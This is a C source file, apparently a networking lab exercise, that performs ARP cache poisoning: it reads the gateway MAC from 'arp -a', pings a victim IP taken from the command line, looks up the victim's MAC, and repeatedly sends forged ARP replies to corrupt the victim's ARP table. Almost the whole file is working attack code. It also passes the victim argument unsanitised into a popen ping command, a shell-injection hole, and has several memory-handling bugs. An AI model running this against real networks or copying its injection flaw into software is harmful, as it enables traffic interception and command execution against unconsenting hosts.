// sudo apt install libnet-dev

//#include <fstream>
#include <pthread.h>
#include "stdafx.h"

#define MAX_PAC_SIZE 100
#define REQ_CNT 20

using namespace std;


// ########## Define a struct for pthread parameters ##########
struct Parameter_Pthread{
  char* sip;
  char* smac;
  char* tip;
  char* tmac;
};

// ########## Sending contaminated ARP packets ##########
// sip : attacker's ip
// smac : attacker's wrong mac
// tip : victim's ip
// tmac : victim's mac
void Attack(void* info){
  struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);
  struct in_addr src_in_addr, target_in_addr;
  struct ARP_header attack_packet; // reply
  struct sockaddr sa;
  //char* recv_str;
  int sock;
  sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP));
  if(sock<0){ perror("socket error"); exit(1); }

  attack_packet.frame_type = htons(ARP_FRAME_TYPE);
  attack_packet.mac_type = htons(ETHER_MAC_TYPE);
  attack_packet.prot_type = htons(IP_PROTO_TYPE);
  attack_packet.mac_addr_size = ETH_MAC_ADDR_LEN;
  attack_packet.prot_addr_size = IP_ADDR_LEN;
  attack_packet.op = htons(OP_ARP_REPLY);

  tomar_ip_addr(&src_in_addr, PP->sip);
  tomar_ip_addr(&target_in_addr, PP->tip);

  tomar_mac_addr(attack_packet.Destination_mac_addr, PP->tmac);
  tomar_mac_addr(attack_packet.target_mac_addr, PP->tmac);
  tomar_mac_addr(attack_packet.src_mac_addr, PP->smac);
  tomar_mac_addr(attack_packet.sender_mac_addr, PP->smac);

  memcpy(attack_packet.sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
  memcpy(attack_packet.target_ip_addr, &target_in_addr, IP_ADDR_LEN);

  bzero(attack_packet.padding, 18);
  strcpy(sa.sa_data, DEFAULT_DEVICE);

  printf("\n----------_ARP_----------\n");
  //Print_ARP(&attack_packet);
  if(sendto(sock, &attack_packet, sizeof(attack_packet), 0, &sa, sizeof(sa)) < 0){
    perror("sendto error");
    exit(1);
  }
}

void Print_Data(const u_char* Packet_DATA){
  for(int i = 0; i < 10; i++) printf("%02x ", Packet_DATA[i]);
  printf("\n");
}

void usage() {
  printf("syntax: ARP_TEST <interface>\n");
  printf("sample: ARP_TEST %s\n", DEFAULT_DEVICE);
}

// ########## Define a function to elimate special character ##########
void delChar(char* buf, char* dest, char ch){
  int cnt = 0;
  for(int i = 0; buf[i] != 0; i++){
    if(buf[i] != ch){
      dest[cnt] = buf[i];
      cnt++;
    }
  }
  buf[cnt] = 0;
}

// ########## Define a function to insert zero ##########
void convert_mac(const char* data, char* cvrt_str, int s){
  char buf[128] = {0x00, };
  char t_buf[8];
  char* stp = strtok((char*)data, ":");
  int temp = 0;
  do{
    memset(t_buf, 0x0, sizeof(t_buf));
    sscanf(stp, "%x", &temp);
    snprintf(t_buf, sizeof(t_buf)-1, "%02x", temp);
    strncat(buf, t_buf, sizeof(buf)-1);
    strncat(buf, ":", sizeof(buf)-1);
  }
  while((stp = strtok(NULL, ":")) != NULL);
  buf[strlen(buf)-1] = '\0';
  strncpy(cvrt_str, buf, s);
}

// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

int main(int argc, char* argv[]) {
  if (argc != 2) {
    usage();
    return -1;
  }

// ########## Find my gateway mac address ##########  
// jamesj@jamesj-VirtualBox:~/arp_test$ arp -a
// ? (192.168.168.102) at 3c:f0:11:28:2a:67 [ether] on enp0s3
// _gateway (192.168.168.1) at c8:3a:35:11:45:98 [ether] on enp0s3
//    0            1        2          3            4    5    6
  FILE* fp = NULL; char line[100]; char* gw_mac_addr; char* dev;
  if((fp = popen("arp -a", "r")) == NULL){ return 1; }

  while(1){
    fgets(line, 100, fp);
    if(line[1] == 'g') break;
  }

  char* ptr; int cnt = 0;
  char* line_result[10];
  ptr = strtok(line, " ");
  while(ptr != NULL){
    //printf("%s\n", ptr);
    line_result[cnt] = ptr;
    cnt++;
    ptr = strtok(NULL, " ");
  }

  if(sizeof(line_result) > 0){
    gw_mac_addr = line_result[3];
    dev = line_result[6];
    *(dev+(strlen(dev)-1)) = 0;
    printf("gw_mac_addr : %s\n", gw_mac_addr);
    printf("dev : %s\n", dev);
  }
  else { perror("Can't find Gateway MAC address"); exit(1); }
  pclose(fp);

// ########################################

// ########## Make a file to write ##########
//  ofstream writeFile1("Result_text.txt");

// ########## Make a thread ##########
  //pthread_t thread;
  //int status = 0;

// ########## Make a struct variable to give several parameters to pthread ##########
  struct Parameter_Pthread pt;

// ########## Make a socket to find my IP & MAC address ##########
  int sockfd, req_cnt = REQ_CNT;
  char s_mac_addr[128] = {0x00, };
  char* s_ip_addr = (char*)malloc(sizeof(128));

  struct sockaddr_in* sock;
  struct ifconf ifcnf_s;
  struct ifreq* ifr_s;

  sockfd = socket(PF_INET, SOCK_DGRAM, 0);
  if(sockfd < 0){
    perror("socket error");
    return -1;
  }

  memset((void*)&ifcnf_s, 0x0, sizeof(ifcnf_s));
  ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
  ifcnf_s.ifc_buf = (char*)malloc(ifcnf_s.ifc_len);
  if(ioctl(sockfd, SIOCGIFCONF, (char*)&ifcnf_s) < 0){
    perror("icoctl - SIOCGIFCONF error");
    return -1;
  }

  if(ifcnf_s.ifc_len > (sizeof(struct ifreq) * req_cnt)){
    req_cnt = ifcnf_s.ifc_len;
    ifcnf_s.ifc_buf = (char*)realloc(ifcnf_s.ifc_buf, req_cnt);
  }

  ifr_s = ifcnf_s.ifc_req;
  for(int cnt = 0; cnt < ifcnf_s.ifc_len; cnt += sizeof(struct ifreq), ifr_s++){
    if(ioctl(sockfd, SIOCGIFFLAGS, ifr_s) < 0){
      perror("ioctl - SIOCGFFLAGS error");
      return -1;
    }

    if(ifr_s->ifr_flags & IFF_LOOPBACK) continue;
    sock = (struct sockaddr_in*)&ifr_s->ifr_addr;
    sprintf(s_ip_addr, "%s", inet_ntoa(sock->sin_addr));
    if(ioctl(sockfd, SIOCGIFHWADDR, ifr_s) < 0){
      perror("ioctl - SIOCGFHWADDR error");
      return -1;
    }
    convert_mac(ether_ntoa((struct ether_addr*)(ifr_s->ifr_hwaddr.sa_data)), s_mac_addr, sizeof(s_mac_addr)-1);
  }
// ########################################

// ########## Make a pcap environment ##########
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
// ########################################

// ################ Using Socket ################
  /*printf("[ Starting to find sender's mac address ]\n");
  struct ARP_header* arph;
  struct in_addr src_in_addr, target_in_addr;
  struct sockaddr sa;
  char* sender_mac = (char*)malloc(sizeof(ETH_MAC_ADDR_LEN)*3);

  tomar_ip_addr(&src_in_addr, s_ip_addr);
  tomar_ip_addr(&target_in_addr, argv[1]);
  memcpy(normal.sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
  memcpy(normal.target_ip_addr, &target_in_addr, IP_ADDR_LEN);

  tomar_mac_addr(normal.Destination_mac_addr, "ffffffffffff");
  tomar_mac_addr(normal.target_mac_addr, "000000000000");
  tomar_mac_addr(normal.src_mac_addr, s_mac_addr);
  tomar_mac_addr(normal.sender_mac_addr, s_mac_addr);
  bzero(normal.padding, 18);

  int s = 0; int one = 1; int i = 0;
  if((s = socket(AF_INET, SOCK_PACKET, SOCK_PACKET)) < 0){
      fprintf(stderr, "\nError : sending the packet\n", pcap_geterr(handle));
      exit(1);
  }
  setuid(getuid());
  if(setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char*)&one, sizeof(one)) < 0){
    perror("setsockopt : SO_BROADCAST");
    exit(1);
  }
  sa.sa_family = 0;
  strcpy(sa.sa_data, dev);

  while(1){
    //if((i = sendto(s, &normal, sizeof(normal), 0, &sa, sizeof(sa))) < 0){
    //  perror("sendto");
    //  exit(1);
    //}

    struct pcap_pkthdr* header;
    const u_char* packet;
    bool isSender = false;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    arph  = (struct ARP_header*)(packet);
    if((int)htons(arph->prot_type) == 2048){
      printf("arph->prot_type : %d\n", htons(arph->prot_type));
      printf("arph->op : %d\n", htons(arph->op));
      printf("arph->sender_ip_addr : %d\n", arph->sender_ip_addr[3]);
    }
    else { printf("Packet is not ARP\n"); }	
    if((int)htons(arph->op) != 2){
      printf("ARP packet is not Reply\n");
    }
    else{
      sprintf(sender_mac, "%0x%0x%0x%0x%0x%0x", arph->sender_mac_addr[0], 
arph->sender_mac_addr[1], arph->sender_mac_addr[2], arph->sender_mac_addr[3], arph->sender_mac_addr[4], arph->sender_mac_addr[5]);
      isSender = true;
    }
    if(isSender) { 
      printf("Sender's MAC address : %s\n", sender_mac);
      printf("[ Succes to find sender's MAC address ]\n");
      break;
    }
    else { printf("< Fail to find sender's MAC address >\n"); }
    sleep(2);
  }
*/

// ################ Using Ping & ARP table ################
  printf("[ Starting to find sender's mac address ]\n");
  FILE* fp_arp_table = NULL; FILE* fp_ping = NULL;
  char line2[100];
  char* line_result1[10];
  char* sender_mac;

  printf("[ Ping to victim ]\n");
  // Ping to victim
  char* ping_str = (char*)malloc(sizeof(char) * 50);
  //strncat(ping_str, argv[1], sizeof(argv[1]));
  sprintf(ping_str, "ping %s", argv[1]);
  printf("%s\n", ping_str);
  if((fp_ping = popen(ping_str, "r")) == NULL){ return 1; }
  pclose(fp_ping);

  printf("[ Open ARP table ]\n");
  // Find a complete arp tuple
  if((fp_arp_table = popen("arp -a", "r")) == NULL){ return 1; }
  while(1){
    fgets(line2, 100, fp_arp_table);
    char* ptr1; int cnt1 = 0;
    ptr1 = strtok(line2, " ");
    while(ptr1 != NULL){
      //printf("%s\n", ptr1);
      line_result1[cnt1] = ptr1;
      cnt1++;
      ptr1 = strtok(NULL, " ");
      if(cnt1 == 4) break;
    }
    cnt1 = 0;
    //printf("%s\n", line_result1[1]);
// find victim's ip addr & delete '(', ')' for comparing with argv[1]
    char* final_dst = (char*)malloc(sizeof(char) * 20);
    if(final_dst == NULL) { perror("final_dst malloc fail"); exit(1); }
    char* dst = (char*)malloc(sizeof(char) * 20);
    if(dst == NULL) { perror("dst malloc fail"); exit(1); }
    char* src = line_result1[1];
    //printf("%s\n", src);
    delChar(src, dst, '(');
    //printf("%s\n", dst);
    delChar(dst, final_dst, ')');
    //printf("%s\n", final_dst);
    if(strcmp(final_dst, argv[1]) == 0){
      sender_mac = line_result1[3];
      break;
    }
  }
  pclose(fp_arp_table);
  printf("[ Success to find sender's mac address : %s ]\n", sender_mac);

// ########################################

  char* a_mac_addr = (char*)malloc(sizeof(s_mac_addr));
  if(a_mac_addr == NULL){ perror("a_mac_addr malloc error"); exit(1); }
  delChar((char*)s_mac_addr, a_mac_addr, ':'); //s_mac_addr

// ########## Make contents of parameters ##########
  pt.sip = (char*)malloc(strlen(s_ip_addr)); // sender's ip address
  if(pt.sip == NULL){ perror("pt.argv_1 malloc error"); exit(1); }
  pt.smac = (char*)malloc(strlen(sender_mac)); // sender's mac address
  if(pt.smac == NULL){ perror("pt.argv_2 malloc error"); exit(1); }

  pt.tip = (char*)malloc(strlen(argv[1])); // attacker's ip address
  if(pt.tip == NULL){ perror("pt.aIPaddr malloc error"); exit(1); }
  pt.tmac = (char*)malloc(strlen(gw_mac_addr)); // attacker's mac address
  if(pt.tmac == NULL){ perror("pt.aMACaddr malloc error"); exit(1); }

  strncpy(pt.sip, s_ip_addr, strlen(s_ip_addr));
  strncpy(pt.smac, gw_mac_addr, strlen(gw_mac_addr));
  strncpy(pt.tip, argv[1], strlen(argv[1]));
  strncpy(pt.tmac, sender_mac, strlen(sender_mac));
// ########################################

for(int i = 0; i < 10; i++) { Attack((void*)&pt); sleep(1); }

// ########## Receiving packets ##########
  /*int count = 0;
  while (count < 10) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    printf("########################\n\n");
    printf("-- %u Bytes captured --\n\n", header->caplen);

    printf("-------_Ethernet_-------\n");
    uint8_t tmp = 0; // Ethernet header size
    Ethernet_header Eh;
    tmp = Eh.Print_Eth(packet);
    struct ARP_header* temp = (struct ARP_header*)(packet);
    check_ARP(packet);
    //printf("packet : %d\n", tmp);
    if(tmp > 14) break;
    //packet += 14;
    printf("\n");
    count++;

// ########## Pthread Create ##########
  //if(pthread_create(&thread, NULL, Attack, (void*)&pt) < 0){
  //  perror("Thread create error"); exit(0);
  //}
// ########################################

    //if(packet){
    //  
    //}
  }*/
  //pthread_join(thread, (void**)&status);
  //printf("Thread %d\n", status);
  pcap_close(handle);
  return 0;
}





